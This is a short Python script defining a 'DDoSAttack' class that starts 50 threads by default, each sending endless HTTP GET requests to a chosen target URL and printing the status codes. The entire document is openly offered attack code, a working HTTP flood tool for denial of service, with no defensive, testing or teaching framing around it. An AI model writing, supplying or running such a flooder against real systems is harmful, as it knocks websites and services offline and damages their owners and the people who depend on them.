import threading
import requests
import time

class DDoSAttack:
    def __init__(self, target_url, num_threads=50):
        self.target_url = target_url
        self.num_threads = num_threads

    def launch_attack(self):
        print(f"Launching DDoS attack on {self.target_url} with {self.num_threads} threads")
        threads = []
        for _ in range(self.num_threads):
            t = threading.Thread(target=self.send_request)
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

    def send_request(self):
        while True:
            try:
                response = requests.get(self.target_url)
                print(f"Request sent, Status Code: {response.status_code}")
                time.sleep(0.1)  # Simulate slight delay between requests
            except requests.exceptions.RequestException as e:
                print(f"Error during request: {e}")
                break
